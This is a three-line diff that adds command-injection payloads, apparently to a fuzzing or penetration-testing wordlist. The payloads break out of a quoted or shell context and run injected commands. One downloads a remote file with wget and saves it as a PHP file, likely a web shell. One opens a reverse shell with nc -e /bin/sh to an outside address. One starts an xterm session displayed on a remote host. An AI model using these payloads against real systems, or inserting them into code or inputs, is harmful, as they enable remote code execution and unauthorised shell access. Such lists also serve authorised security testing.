@@ -1,0 +1,3 @@
+';wget http://site.com/file.txt -O file.php; echo 'mission done
+;nc -e /bin/sh 10.0.0.1 1234
+`xterm -display 10.0.0.1:1`
